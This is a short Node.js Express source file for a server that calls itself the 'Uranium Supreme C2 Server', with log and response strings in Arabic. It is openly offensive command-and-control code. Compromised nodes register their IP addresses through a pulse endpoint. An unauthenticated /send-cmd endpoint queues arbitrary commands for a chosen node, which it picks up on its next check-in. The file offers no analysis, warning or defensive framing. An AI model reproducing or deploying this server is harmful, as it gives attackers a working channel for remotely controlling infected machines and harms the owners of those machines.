const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let activeNodes = {};
let pendingCommands = {};

app.post('/node/pulse', (req, res) => {
    const { node_id, status } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const targetId = node_id || "Nasser_Supreme_Node";
    activeNodes[targetId] = {
        ip: clientIp,
        lastSeen: Date.now(),
        status: status || 'online'
    };
    
    console.log(`[⚡] عقدة يورانيوم متصلة بنجاح: ${targetId} من IP: ${clientIp}`);
    
    let responsePayload = "ACK_OK";
    if (pendingCommands[targetId]) {
        responsePayload = `CMD:${pendingCommands[targetId]}`;
        delete pendingCommands[targetId];
    }
    
    res.status(200).send(responsePayload);
});

app.get('/nodes', (req, res) => {
    res.json({
        empire: "مملكة ناصر دين الله الكلعي - Uranium Supreme v8.1 Ultimate",
        activeCount: Object.keys(activeNodes).length,
        nodes: activeNodes
    });
});

app.get('/send-cmd', (req, res) => {
    const { node_id, cmd } = req.query;
    const targetId = node_id || "Nasser_Supreme_Node";
    if (!cmd) {
        return res.status(400).send("الرجاء تحديد أمر التنفيذ عبر ?cmd=...");
    }
    pendingCommands[targetId] = cmd;
    res.send(`[+] تم جدولة الأمر بنجاح للعقدة [${targetId}]: ${cmd}`);
});

app.get('/', (req, res) => {
    res.send("<h1>[⚡] Uranium Supreme C2 Server v8.1 Online</h1>");
});

app.listen(PORT, () => {
    console.log(`[+] Uranium C2 Server running on port ${PORT}`);
});
